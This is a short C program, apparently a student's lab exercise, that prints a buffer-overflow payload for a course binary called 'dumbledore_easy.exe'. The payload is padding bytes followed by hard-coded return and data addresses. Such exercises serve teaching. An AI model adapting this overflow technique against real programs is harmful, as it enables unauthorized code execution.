// Wright Kim
// wdk7bj
// ./dumbledore_easy.exe

#include <stdio.h>
#include <string.h>

char attackString[] = "Wright Kim";

int main(){
	int i;
	char *p = attackString;

	unsigned char a = 0x41;

	unsigned char b = 0x66;

	unsigned char ret[] = {0x0f,0x85,0x04,0x08};
	
	unsigned char name[] = {0x60,0xa0,0x04,0x08};
	
	for(i = 0; i < sizeof(attackString); i++){
		putchar(*p);
		p++;
	}
	for(i = 0; i < 120; i++){
		putchar(a);
	}
	putchar(b);
	for(i = 0; i < 15; i++){
		putchar(a);
	}
	for(i = 0; i < 4; i++){
		putchar(ret[i]);
	}

	for(i = 0; i < 4; i++){
		putchar(name[i]);
	}
	
	return 1;
}
